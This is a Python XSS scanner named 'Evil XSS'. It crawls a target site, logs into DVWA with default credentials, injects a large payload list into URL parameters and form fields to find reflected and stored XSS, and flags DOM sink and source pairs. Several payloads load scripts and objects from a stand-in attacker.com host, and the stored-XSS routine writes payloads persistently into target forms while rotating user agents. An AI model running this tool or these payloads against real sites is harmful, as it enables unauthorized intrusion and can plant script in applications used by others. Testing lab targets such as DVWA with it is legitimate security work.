#!/usr/bin/env python3
# Evil XSS - Reflected, Stored & DOM XSS Scanner
# Fixed: checks POST response for stored XSS, includes all form fields.

import os
import random
import re
import json
import time
import logging
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Set, Tuple
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse, unquote_plus
import requests
from bs4 import BeautifulSoup

# ===========================
# Config and Colors
# ===========================
@dataclass
class Config:
    timeout: int = 10
    delay: float = 0.5
    max_depth: int = 2
    use_cookies: bool = True
    threads: int = 5

class Colors:
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    BOLD_MAGENTA = "\033[1;95m"
    CYAN = "\033[96m"
    RESET = "\033[0m"

DEBUG = False
def info(msg: str) -> None:
    print(f"{Colors.GREEN}[*] {msg}{Colors.RESET}")
def warn(msg: str) -> None:
    print(f"{Colors.YELLOW}[!] {msg}{Colors.RESET}")
def error(msg: str) -> None:
    print(f"{Colors.RED}[-] {msg}{Colors.RESET}")
def good(msg: str) -> None:
    print(f"{Colors.BOLD_MAGENTA}[+] {msg}{Colors.RESET}")
def diag(msg: str) -> None:
    print(f"{Colors.CYAN}[*] {msg}{Colors.RESET}")
def debug(msg: str) -> None:
    if DEBUG:
        print(f"{Colors.CYAN}[DEBUG]{Colors.RESET} {msg}")

# ===========================
# Helpers
# ===========================
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

def save_json(folder: str, name: str, obj: dict) -> None:
    path = os.path.join(folder, name)
    with open(path, "w", encoding="utf-8") as f:
        json.dump(obj, f, indent=2, ensure_ascii=False)
    info(f"Saved: {path}")

def same_domain(a: str, b: str) -> bool:
    return urlparse(a).netloc == urlparse(b).netloc

def normalize_url(u: str) -> str:
    pr = urlparse(u)
    qs = parse_qs(pr.query, keep_blank_values=True)
    sorted_qs = urlencode({k: v[0] if v else "" for k, v in sorted(qs.items())})
    return urlunparse((pr.scheme, pr.netloc, pr.path, pr.params, sorted_qs, ""))

def pretty_url(u: str) -> str:
    return unquote_plus(u)

# ===========================
# HTTP Client
# ===========================
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.43",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
]
DEFAULT_HEADERS = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-alive",
}
class HttpClient:
    def __init__(self, timeout: int = 10, delay: float = 0.5, use_cookies: bool = True):
        self.session = requests.Session()
        self.timeout = timeout
        self.delay = delay
        self.use_cookies = use_cookies
        if not use_cookies:
            self.session.cookies.clear()
    def login_dvwa(self, base_url: str, username="admin", password="password", security="low") -> bool:
        login_url = f"{base_url.rstrip('/')}/login.php"
        security_url = f"{base_url.rstrip('/')}/security.php"
        self.session.headers.update({
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "DNT": "1",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
        })
        try:
            resp = self.session.get(login_url, timeout=self.timeout)
            debug(f"Login page status: {resp.status_code}")
            token_match = re.search(r"name='user_token' value='([^']+)'", resp.text)
            user_token = token_match.group(1) if token_match else ""
            debug(f"CSRF token found: {bool(token_match)}")
        except Exception as e:
            error(f"Could not fetch DVWA login page: {e}")
            return False
        data = {
            "username": username,
            "password": password,
            "Login": "Login",
            "user_token": user_token
        }
        try:
            resp = self.session.post(login_url, data=data, timeout=self.timeout, allow_redirects=True)
            debug(f"Login response URL: {resp.url}")
            debug(f"Login response status: {resp.status_code}")
            if "login.php" in resp.url.lower():
                warn("DVWA login failed — check credentials or CSRF token")
                error_match = re.search(r'<p class="error">(.*?)</p>', resp.text, re.IGNORECASE)
                if error_match:
                    warn(f"Login error: {error_match.group(1)}")
                return False
        except Exception as e:
            error(f"DVWA login request failed: {e}")
            return False
        try:
            sec_resp = self.session.get(security_url, timeout=self.timeout)
            token_match = re.search(r"name='user_token' value='([^']+)'", sec_resp.text)
            user_token = token_match.group(1) if token_match else ""
            data = {"security": security, "seclev_submit": "Submit", "user_token": user_token}
            self.session.post(security_url, data=data, timeout=self.timeout, allow_redirects=True)
            good(f"DVWA login successful, security set to '{security}'")
            return True
        except Exception as e:
            error(f"Could not set DVWA security: {e}")
            return False
    def get(self, url: str) -> Optional[requests.Response]:
        time.sleep(self.delay)
        headers = DEFAULT_HEADERS.copy()
        headers["User-Agent"] = random.choice(USER_AGENTS)
        debug(f"HTTP GET -> {pretty_url(url)}")
        try:
            response = self.session.get(
                url, headers=headers, timeout=self.timeout, allow_redirects=True
            )
            debug(f"Status: {response.status_code} | len(body)= {len(response.text)}")
            response.raise_for_status()
            return response
        except requests.exceptions.HTTPError as e:
            if e.response is not None and e.response.status_code == 403:
                warn(f"Access denied (403) for {pretty_url(url)}")
            else:
                error(f"HTTP Error: {e} for {pretty_url(url)}")
        except requests.exceptions.Timeout:
            error(f"Timeout occurred for {pretty_url(url)}")
        except requests.exceptions.RequestException as e:
            error(f"Request failed: {pretty_url(url)} ({e})")
        return None
    def post(self, url: str, data: Optional[Dict] = None) -> Optional[requests.Response]:
        time.sleep(self.delay)
        headers = DEFAULT_HEADERS.copy()
        headers["User-Agent"] = random.choice(USER_AGENTS)
        debug(f"HTTP POST -> {pretty_url(url)} with data {data}")
        try:
            response = self.session.post(
                url, data=data, headers=headers, timeout=self.timeout, allow_redirects=True
            )
            debug(f"Status: {response.status_code} | len(body)= {len(response.text)}")
            response.raise_for_status()
            return response
        except requests.exceptions.RequestException as e:
            error(f"POST request failed: {pretty_url(url)} ({e})")
        return None

# ===========================
# Crawling
# ===========================
@dataclass
class CrawlResult:
    url: str
    params: List[str] = field(default_factory=list)
    form_params: Dict[str, List[str]] = field(default_factory=dict)
    form_methods: Dict[str, str] = field(default_factory=dict)
    form_defaults: Dict[str, Dict[str, str]] = field(default_factory=dict)

class Crawler:
    def __init__(self, base_url: str, depth: int = 2, client: Optional[HttpClient] = None):
        self.base_url = base_url.rstrip("/")
        self.depth = max(1, depth)
        self.client = client or HttpClient()
        self.visited: Set[str] = set()
        self.endpoints: Dict[str, Set[str]] = {}
        self.forms: Dict[str, Dict[str, Set[str]]] = {}
        self.form_methods: Dict[str, Dict[str, str]] = {}
        self.form_defaults: Dict[str, Dict[str, Dict[str, str]]] = {}

    def run(self) -> List[CrawlResult]:
        info(f"Starting crawl on: {self.base_url}")
        self._crawl(self.base_url, self.depth)
        results: List[CrawlResult] = []
        for u, params in self.endpoints.items():
            results.append(CrawlResult(u, sorted(list(params))))
        for page_url, form_data in self.forms.items():
            existing = next((r for r in results if r.url == page_url), None)
            if existing:
                for action, params in form_data.items():
                    existing.form_params[action] = sorted(list(set(params)))
                    existing.form_methods[action] = self.form_methods.get(page_url, {}).get(action, "GET")
                    existing.form_defaults[action] = self.form_defaults.get(page_url, {}).get(action, {})
            else:
                res = CrawlResult(page_url, [])
                for action, params in form_data.items():
                    res.form_params[action] = sorted(list(set(params)))
                    res.form_methods[action] = self.form_methods.get(page_url, {}).get(action, "GET")
                    res.form_defaults[action] = self.form_defaults.get(page_url, {}).get(action, {})
                results.append(res)
        debug(f"Crawl discovered {len(results)} endpoints with params or forms")
        return results

    def _crawl(self, url: str, depth: int) -> None:
        url = normalize_url(url)
        if depth <= 0 or url in self.visited:
            debug(f"Skipping (visited/depth): {url} (depth={depth})")
            return
        self.visited.add(url)
        resp = self.client.get(url)
        if not resp or "text/html" not in (resp.headers.get("Content-Type") or ""):
            debug(f"Non-HTML or no response: {url}")
            return
        soup = BeautifulSoup(resp.text, "html.parser")
        pr = urlparse(url)
        if pr.query:
            params = list(parse_qs(pr.query, keep_blank_values=True).keys())
            self.endpoints.setdefault(url, set()).update(params)
            info(f"Found endpoint: {url} -> {params}")
        for form in soup.find_all("form"):
            action = form.get("action")
            if action:
                action_url = urljoin(url, action)
                if not same_domain(action_url, self.base_url):
                    continue
            else:
                action_url = url
            method = form.get("method", "GET").upper()
            inputs = form.find_all(["input", "textarea", "select"])
            param_names = []
            defaults = {}
            for inp in inputs:
                name = inp.get("name")
                if not name:
                    continue
                param_names.append(name)
                if inp.get("value") is not None:
                    defaults[name] = inp.get("value")
                elif inp.name == "textarea" and inp.string:
                    defaults[name] = inp.string.strip()
            if param_names:
                self.forms.setdefault(url, {}).setdefault(action_url, set()).update(param_names)
                self.form_methods.setdefault(url, {})[action_url] = method
                self.form_defaults.setdefault(url, {}).setdefault(action_url, {}).update(defaults)
                info(f"Found form at {url} -> action={action_url}, params={param_names}, defaults={defaults}, method={method}")
        for a in soup.find_all("a", href=True):
            href = a["href"]
            nxt = urljoin(url, href)
            if not same_domain(nxt, self.base_url):
                continue
            link_pr = urlparse(nxt)
            if link_pr.query:
                link_params = list(parse_qs(link_pr.query, keep_blank_values=True).keys())
                self.endpoints.setdefault(nxt, set()).update(link_params)
                info(f"Found link endpoint: {nxt} -> {link_params}")
            self._crawl(nxt, depth - 1)

# ===========================
# XSS Payloads and DOM sources/sinks
# ===========================
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<details open ontoggle=alert(1)>",
    "<a href=javascript:alert(1)>click</a>",
    "<marquee onstart=alert(1)>",
    "<script>alert(document.domain)</script>",
    "<img src=\"x\" onerror=\"alert('XSS')\">",
    "'';!--\"<XSS>=&{()}",
    "<SCRIPT>alert('XSS')</SCRIPT>",
    "<IMG SRC=\"javascript:alert('XSS');\">",
    "<IMG SRC=javascript:alert('XSS')>",
    "<IMG SRC=JaVaScRiPt:alert('XSS')>",
    "<IMG SRC=`javascript:alert(\"XSS\")`>",
    "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\"",
    "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
    "<IMG SRC=# onmouseover=\"alert('XSS')\">",
    "<IMG SRC= onmouseover=\"alert('XSS')\">",
    "<IMG SRC=/ onerror=\"alert(String.fromCharCode(88,83,83))\"></img>",
    "<BODY ONLOAD=alert('XSS')>",
    "<BODY BACKGROUND=\"javascript:alert('XSS')\">",
    "<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>",
    "<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>",
    "<TABLE BACKGROUND=\"javascript:alert('XSS')\">",
    "<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">",
    "<DIV STYLE=\"width: expression(alert('XSS'));\">",
    "<STYLE>@import'javascript:alert(\"XSS\")';</STYLE>",
    "<STYLE TYPE=\"text/javascript\">alert('XSS');</STYLE>",
    "<STYLE>.XSS{background-image:url(\"javascript:alert('XSS')\");}</STYLE>",
    "<A HREF=\"javascript:document.location='http://www.google.com/'\">XSS</A>",
    "<A HREF=\"javascript:alert('XSS')\">XSS</A>",
    "<A HREF=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=\">XSS</A>",
    "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">",
    "<META HTTP-EQUIV=\"Link\" Content=\"<http://example.com/>; REL=stylesheet\">",
    "<OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://attacker.com/xss.html\"></OBJECT>",
    "<APPLET CODE=\"http://attacker.com/xss.class\" WIDTH=0 HEIGHT=0></APPLET>",
    "<EMBED SRC=\"http://attacker.com/xss.swf\" AllowScriptAccess=\"always\"></EMBED>",
    "<XML ID=\"I\" SRC=\"http://attacker.com/xss.xml\"></XML>",
    "<SCRIPT SRC=\"http://attacker.com/xss.js\"></SCRIPT>",
    "<LINK REL=\"stylesheet\" HREF=\"http://attacker.com/xss.css\">",
    "<STYLE>BODY{-moz-binding:url(\"http://attacker.com/xss.xml#xss\")}</STYLE>",
    "<BASE HREF=\"javascript:alert('XSS');\">",
    "<BGSOUND SRC=\"javascript:alert('XSS');\">",
    "<BR SIZE=\"&{alert('XSS')}\">",
    "<LAYER SRC=\"http://attacker.com/xss.js\"></LAYER>",
    "<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">",
    "<STYLE>@import\"javascript:alert('XSS')\";</STYLE>",
    "<STYLE>@import'javascript:alert(\"XSS\")';</STYLE>",
    "<STYLE>@import url(javascript:alert('XSS'));</STYLE>",
    "<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE>",
    "<XSS STYLE=\"behavior: url(javascript:alert('XSS'));\">",
    "<XSS STYLE=\"background-image: url(javascript:alert('XSS'));\">",
    "<XSS STYLE=\"width: expression(alert('XSS'));\">",
    "<DIV STYLE=\"position:absolute;left:0;top:0;width:100%;height:100%;\" ONMOUSEOVER=\"alert('XSS')\">",
    "<DIV STYLE=\"background-color:#f00;\" ONMOUSEOVER=\"alert('XSS')\">",
    "<DIV ONMOUSEOVER=\"alert('XSS')\">",
    "<DIV ONCLICK=\"alert('XSS')\">",
    "<DIV ONKEYDOWN=\"alert('XSS')\">",
    "<DIV ONKEYUP=\"alert('XSS')\">",
    "<DIV ONKEYPRESS=\"alert('XSS')\">",
    "<DIV ONFOCUS=\"alert('XSS')\">",
    "<DIV ONBLUR=\"alert('XSS')\">",
    "<DIV ONCHANGE=\"alert('XSS')\">",
    "<DIV ONSELECT=\"alert('XSS')\">",
    "<DIV ONSUBMIT=\"alert('XSS')\">",
    "<DIV ONRESET=\"alert('XSS')\">",
    "<DIV ONLOAD=\"alert('XSS')\">",
    "<DIV ONUNLOAD=\"alert('XSS')\">",
    "<DIV ONERROR=\"alert('XSS')\">",
    "<DIV ONPAGEHIDE=\"alert('XSS')\">",
    "<DIV ONPAGESHOW=\"alert('XSS')\">",
    "<DIV ONRESIZE=\"alert('XSS')\">",
    "<DIV ONSCROLL=\"alert('XSS')\">",
    "<DIV ONCONTEXTMENU=\"alert('XSS')\">",
    "<DIV ONDBLCLICK=\"alert('XSS')\">",
    "<DIV ONMOUSEDOWN=\"alert('XSS')\">",
    "<DIV ONMOUSEUP=\"alert('XSS')\">",
    "<DIV ONMOUSEOUT=\"alert('XSS')\">",
    "<DIV ONMOUSEOVER=\"alert('XSS')\">",
    "<DIV ONMOUSEMOVE=\"alert('XSS')\">",
    "<DIV ONFOCUSIN=\"alert('XSS')\">",
    "<DIV ONFOCUSOUT=\"alert('XSS')\">",
    "<DIV ONINPUT=\"alert('XSS')\">",
    "<DIV ONINVALID=\"alert('XSS')\">",
    "<DIV ONBEFOREUNLOAD=\"alert('XSS')\">",
    "<DIV ONAFTERPRINT=\"alert('XSS')\">",
    "<DIV ONBEFOREPRINT=\"alert('XSS')\">",
    "<DIV ONPOPSTATE=\"alert('XSS')\">",
    "<DIV ONHASHCHANGE=\"alert('XSS')\">",
    "<DIV ONMESSAGE=\"alert('XSS')\">",
    "<DIV ONOFFLINE=\"alert('XSS')\">",
    "<DIV ONONLINE=\"alert('XSS')\">",
    "<DIV ONPAGESHOW=\"alert('XSS')\">",
    "<DIV ONPAGEHIDE=\"alert('XSS')\">",
    "<DIV ONREADY=\"alert('XSS')\">",
    "<DIV ONSTATE=\"alert('XSS')\">",
    "<DIV ONTIME=\"alert('XSS')\">",
    "<DIV ONTRACK=\"alert('XSS')\">",
    "<DIV ONUNLOAD=\"alert('XSS')\">",
    "<DIV ONVOLUMECHANGE=\"alert('XSS')\">",
    "<DIV ONWAITING=\"alert('XSS')\">",
]

DOM_SINKS = [
    "document.write", "document.writeln", "eval", "setTimeout", "setInterval",
    "Function", "execScript", "innerHTML", "outerHTML", "insertAdjacentHTML",
    "document.location", "window.location", "location.href", "location.assign",
    "location.replace", "window.open", "document.cookie", "document.domain",
    "document.referrer", "window.name", "window.opener", "window.frames",
    "window.postMessage", "Worker", "SharedWorker", "ServiceWorker", "importScripts"
]
DOM_SOURCES = [
    "document.URL", "document.documentURI", "document.baseURI", "location.href",
    "location.search", "location.hash", "location.pathname", "location.protocol",
    "location.hostname", "location.port", "location.origin", "document.referrer",
    "window.name", "window.parent", "window.top", "window.frames", "window.opener",
    "document.cookie", "sessionStorage", "localStorage", "postMessage"
]

# ===========================
# Findings
# ===========================
@dataclass
class Finding:
    url: str
    param: str
    technique: str
    payload: str
    severity: str = "Medium"
    confidence: float = 0.0
    def to_dict(self):
        return {
            "url": self.url, "param": self.param, "technique": self.technique,
            "payload": self.payload, "severity": self.severity,
            "confidence": self.confidence,
        }

# ===========================
# Scanner
# ===========================
class Scanner:
    def __init__(self, client: Optional[HttpClient] = None, config: Optional[Config] = None):
        self.client = client or HttpClient(timeout=10)
        self.config = config or Config()
        self.findings: List[Finding] = []

    def _calculate_confidence(self, technique: str) -> float:
        return {"Reflected": 0.95, "Stored": 0.85, "DOM": 0.70}.get(technique, 0.80)

    def _calculate_severity(self, technique: str) -> str:
        return {"Reflected": "Medium", "Stored": "High", "DOM": "High"}.get(technique, "Medium")

    def _is_blocked(self, html: str) -> bool:
        if not html:
            return False
        html_lower = html.lower()
        indicators = ["cloudflare", "incapsula", "akamai", "imperva", "modsecurity", "web application firewall"]
        return any(i in html_lower for i in indicators)

    def _is_reflected(self, payload: str, response_text: str) -> bool:
        if payload in response_text:
            return True
        from html import unescape
        return payload in unescape(response_text)

    def _test_reflected(self, url: str, param: str) -> Optional[Finding]:
        diag(f"Testing Reflected XSS for parameter '{param}'")
        for payload in XSS_PAYLOADS:
            test_url = apply_payload_to_url(url, param, payload, append=True)
            debug(f"Reflected test: {pretty_url(test_url)}")
            resp = self.client.get(test_url)
            if not resp:
                continue
            if self._is_blocked(resp.text):
                warn(f"Blocked: {test_url}")
                continue
            if self._is_reflected(payload, resp.text):
                good(f"Reflected XSS on {param} with {payload}")
                return Finding(url, param, "Reflected", payload,
                               self._calculate_severity("Reflected"),
                               self._calculate_confidence("Reflected"))
        return None

    def _test_stored(self, url: str, param: str, action_url: str, method: str = "POST",
                     defaults: Optional[Dict[str, str]] = None,
                     all_params: Optional[List[str]] = None) -> Optional[Finding]:
        diag(f"Testing Stored XSS for param '{param}' (action={action_url}, method={method})")
        for payload in XSS_PAYLOADS:
            if method.upper() == "GET":
                inject_url = apply_payload_to_url(action_url, param, payload, append=True)
                debug(f"Stored GET inject: {pretty_url(inject_url)}")
                resp_inj = self.client.get(inject_url)
                if not resp_inj:
                    continue
                resp_check = self.client.get(action_url)
                if resp_check and self._is_reflected(payload, resp_check.text):
                    good(f"Stored XSS (GET) on {param} with {payload}")
                    return Finding(url, param, "Stored", payload,
                                   self._calculate_severity("Stored"),
                                   self._calculate_confidence("Stored"))
            else:  # POST
                if all_params:
                    full_data = {p: defaults.get(p, '') for p in all_params}
                else:
                    full_data = defaults.copy() if defaults else {}
                full_data[param] = payload

                debug(f"Stored POST inject: {pretty_url(action_url)} data={full_data}")
                resp_post = self.client.post(action_url, data=full_data)
                if not resp_post:
                    continue

                # DEBUG: show first 500 chars of response to verify payload presence
                debug(f"Response snippet (first 500 chars): {resp_post.text[:500]}")

                # Check the POST response first (often contains updated page)
                if self._is_reflected(payload, resp_post.text):
                    good(f"Stored XSS (POST response) on {param} with {payload}")
                    return Finding(url, param, "Stored", payload,
                                   self._calculate_severity("Stored"),
                                   self._calculate_confidence("Stored"))

                # Also check a fresh GET (in case of redirect or cache)
                resp_check = self.client.get(action_url)
                if resp_check and self._is_reflected(payload, resp_check.text):
                    good(f"Stored XSS (GET after POST) on {param} with {payload}")
                    return Finding(url, param, "Stored", payload,
                                   self._calculate_severity("Stored"),
                                   self._calculate_confidence("Stored"))
        return None

    def _test_dom(self, url: str) -> Optional[Finding]:
        diag("Testing DOM XSS via static analysis")
        resp = self.client.get(url)
        if not resp:
            return None
        soup = BeautifulSoup(resp.text, "html.parser")
        js_code = ""
        for script in soup.find_all("script"):
            if script.string:
                js_code += script.string + "\n"
        for tag in soup.find_all(attrs=True):
            for attr, value in tag.attrs.items():
                if attr.startswith("on") or attr in ("href", "src"):
                    if "javascript:" in value.lower() or "alert" in value:
                        js_code += f"// {attr}={value}\n"
        if not js_code:
            return None
        if any(sink in js_code for sink in DOM_SINKS) and any(source in js_code for source in DOM_SOURCES):
            good(f"Potential DOM XSS on {url}")
            payload = "DOM XSS potential via sinks: " + ", ".join([s for s in DOM_SINKS if s in js_code])
            return Finding(url, "N/A", "DOM", payload,
                           self._calculate_severity("DOM"),
                           self._calculate_confidence("DOM"))
        return None

    # DVWA-specific stored test (fallback)
    def _test_dvwa_xss_s(self, url: str) -> Optional[Finding]:
        diag("Special DVWA xss_s stored XSS test")
        for payload in XSS_PAYLOADS:
            post_data = {"mtxMessage": payload, "txtName": "test", "btnSign": "Sign Guestbook"}
            debug(f"DVWA xss_s POST inject: {url} data={post_data}")
            resp_post = self.client.post(url, data=post_data)
            if not resp_post:
                continue
            # Check POST response
            if self._is_reflected(payload, resp_post.text):
                good(f"Stored XSS (DVWA) on mtxMessage with {payload}")
                return Finding(url, "mtxMessage", "Stored", payload,
                               self._calculate_severity("Stored"),
                               self._calculate_confidence("Stored"))
            # Also check GET
            resp_check = self.client.get(url)
            if resp_check and self._is_reflected(payload, resp_check.text):
                good(f"Stored XSS (DVWA) on mtxMessage with {payload}")
                return Finding(url, "mtxMessage", "Stored", payload,
                               self._calculate_severity("Stored"),
                               self._calculate_confidence("Stored"))
            # Now txtName
            post_data = {"mtxMessage": "test", "txtName": payload, "btnSign": "Sign Guestbook"}
            debug(f"DVWA xss_s POST inject: {url} data={post_data}")
            resp_post = self.client.post(url, data=post_data)
            if not resp_post:
                continue
            if self._is_reflected(payload, resp_post.text):
                good(f"Stored XSS (DVWA) on txtName with {payload}")
                return Finding(url, "txtName", "Stored", payload,
                               self._calculate_severity("Stored"),
                               self._calculate_confidence("Stored"))
            resp_check = self.client.get(url)
            if resp_check and self._is_reflected(payload, resp_check.text):
                good(f"Stored XSS (DVWA) on txtName with {payload}")
                return Finding(url, "txtName", "Stored", payload,
                               self._calculate_severity("Stored"),
                               self._calculate_confidence("Stored"))
        return None

    def scan_param(self, url: str, param: str, folder: str, is_form: bool = False,
                   action_url: str = None, method: str = "POST",
                   defaults: Optional[Dict[str, str]] = None,
                   all_params: Optional[List[str]] = None,
                   scan_types: List[str] = None) -> Optional[Finding]:
        info(f"Scanning parameter: {param} (form={is_form})")
        if param.lower() in ["submit", "csrf_token", "user_token"]:
            debug("Skipping token/submit parameter")
            return None

        if scan_types is None:
            scan_types = ['reflected', 'stored', 'dom']

        if 'reflected' in scan_types and not is_form:
            finding = self._test_reflected(url, param)
            if finding:
                return finding

        if 'stored' in scan_types:
            if action_url is None:
                action_url = url
            finding = self._test_stored(url, param, action_url, method, defaults, all_params)
            if finding:
                return finding

        return None

# ===========================
# Helper to apply payload to URL
# ===========================
def apply_payload_to_url(url: str, param: str, payload: str, append: bool = True) -> str:
    pr = urlparse(url)
    qs = parse_qs(pr.query, keep_blank_values=True)
    if param in qs:
        if append:
            cur = qs[param][0] if qs[param] else ""
            qs[param] = [cur + payload]
        else:
            qs[param] = [payload]
    new_query = urlencode({k: v[0] if v else "" for k, v in qs.items()})
    return urlunparse((pr.scheme, pr.netloc, pr.path, pr.params, new_query, ""))

# ===========================
# Orchestrator
# ===========================
class App:
    def __init__(self, config: Optional[Config] = None):
        self.config = config or Config()
        self.client = HttpClient(timeout=self.config.timeout, delay=self.config.delay, use_cookies=self.config.use_cookies)
        self.scanner = Scanner(self.client, self.config)

    def _setup_logging(self, verbose: bool) -> None:
        level = logging.DEBUG if verbose else logging.INFO
        logging.basicConfig(
            level=level,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[logging.StreamHandler()]
        )

    def run(self, args_list=None) -> None:
        import argparse
        parser = argparse.ArgumentParser(
            description="Evil XSS - Reflected, Stored & DOM XSS Scanner (threaded, type‑selectable)",
            formatter_class=argparse.RawTextHelpFormatter,
            epilog=("Examples:\n"
                    "  python Evil_XSS.py -u http://localhost/dvwa/vulnerabilities/xss_s/ --dvwa-login --mode scan\n"
                    "  python Evil_XSS.py -u https://example.com/page.php?id=1 --types reflected,stored\n"
                    "  python Evil_XSS.py -u https://example.com --types dom --threads 10\n")
        )
        parser.add_argument('-u', '--url', required=True, help='Target URL')
        parser.add_argument('--mode', choices=['crawl', 'scan'], default='scan')
        parser.add_argument('--depth', type=int, default=2, help='Crawl depth (default: 2)')
        parser.add_argument('--delay', type=float, default=0.5, help='Delay between requests (default: 0.5)')
        parser.add_argument('--timeout', type=int, default=10, help='Request timeout (default: 10)')
        parser.add_argument('--threads', type=int, default=5, help='Number of concurrent scan threads (default: 5)')
        parser.add_argument('--no-cookies', action='store_true', help='Disable cookies')
        parser.add_argument('--verbose', action='store_true', help='Enable verbose logging')
        parser.add_argument('--debug', action='store_true', help='Enable debug prints')
        parser.add_argument('--dvwa-login', action='store_true', help='Auto‑login to DVWA')
        parser.add_argument('--types', type=str, default='reflected,stored,dom',
                            help='Comma‑separated vulnerability types to scan: reflected, stored, dom (default: all)')
        parser.add_argument('--output', required=True, help='Output directory for JSON result (must exist)')
        args = parser.parse_args(args_list)

        global DEBUG
        DEBUG = bool(args.debug)

        scan_types = [t.strip().lower() for t in args.types.split(',') if t.strip()]
        valid_types = {'reflected', 'stored', 'dom'}
        scan_types = [t for t in scan_types if t in valid_types]
        if not scan_types:
            warn("No valid scan types specified; defaulting to all.")
            scan_types = ['reflected', 'stored', 'dom']

        self.config = Config(
            timeout=args.timeout,
            delay=args.delay,
            use_cookies=not args.no_cookies,
            threads=args.threads,
        )
        self._setup_logging(args.verbose)
        self.client = HttpClient(timeout=args.timeout, delay=args.delay, use_cookies=not args.no_cookies)
        self.scanner = Scanner(self.client, self.config)

        if args.dvwa_login or "dvwa" in args.url.lower():
            from urllib.parse import urlparse
            base_url = f"{urlparse(args.url).scheme}://{urlparse(args.url).netloc}/dvwa"
            if self.client.login_dvwa(base_url, username="admin", password="password", security="low"):
                info("DVWA authentication successful")
            else:
                warn("DVWA authentication failed, continuing")

        folder = args.output

        if args.mode == 'crawl':
            self.do_crawl(args.url, args.depth, folder)
        else:
            self.do_scan(args.url, args.depth, folder, scan_types)

    def do_crawl(self, target: str, depth: int, folder: str) -> None:
        crawler = Crawler(target, depth=depth, client=self.client)
        results = crawler.run()
        # No text file output; only JSON (but crawl doesn't produce findings, so we just log)
        info(f"Crawl complete. Discovered {len(results)} pages with parameters/forms.")

    def do_scan(self, target: str, depth: int, folder: str, scan_types: List[str]) -> None:
        parsed = urlparse(target)
        if parsed.query and parse_qs(parsed.query):
            params = list(parse_qs(parsed.query).keys())
            endpoints = [CrawlResult(target, params)]
        else:
            crawler = Crawler(target, depth=depth, client=self.client)
            endpoints = crawler.run()

        tasks = []
        for ep in endpoints:
            for p in ep.params:
                tasks.append({
                    'url': ep.url,
                    'param': p,
                    'is_form': False,
                    'action_url': ep.url,
                    'method': 'GET',
                    'defaults': {},
                    'all_params': [],
                })
            for action, params in ep.form_params.items():
                method = ep.form_methods.get(action, "POST")
                defaults = ep.form_defaults.get(action, {})
                for p in params:
                    tasks.append({
                        'url': ep.url,
                        'param': p,
                        'is_form': True,
                        'action_url': action,
                        'method': method,
                        'defaults': defaults,
                        'all_params': params,
                    })

        if not tasks:
            warn("No parameters discovered. Trying brute‑force stored XSS on target...")
            finding = self.scanner._test_dvwa_xss_s(target)
            if finding:
                self.scanner.findings.append(finding)
        else:
            info(f"Queued {len(tasks)} parameter scans (using {self.config.threads} threads).")
            with ThreadPoolExecutor(max_workers=self.config.threads) as executor:
                future_to_task = {
                    executor.submit(
                        self.scanner.scan_param,
                        task['url'],
                        task['param'],
                        folder,
                        task['is_form'],
                        task['action_url'],
                        task['method'],
                        task['defaults'],
                        task['all_params'],
                        scan_types
                    ): task
                    for task in tasks
                }
                for future in as_completed(future_to_task):
                    task = future_to_task[future]
                    try:
                        finding = future.result()
                        if finding:
                            self.scanner.findings.append(finding)
                    except Exception as e:
                        error(f"Error scanning {task['param']}: {e}")

        if 'dom' in scan_types:
            dom_tested = set()
            for ep in endpoints:
                if ep.url not in dom_tested:
                    dom_tested.add(ep.url)
                    finding = self.scanner._test_dom(ep.url)
                    if finding:
                        self.scanner.findings.append(finding)

        if self.scanner.findings:
            save_json(folder, "scan_result.json",
                      {"target": target, "findings": [f.to_dict() for f in self.scanner.findings]})
        else:
            warn("No XSS findings found.")

# ===========================
# Entry
# ===========================
if __name__ == "__main__":
    try:
        App().run(sys.argv[1:])
    except KeyboardInterrupt:
        print()
        warn("Interrupted by user.")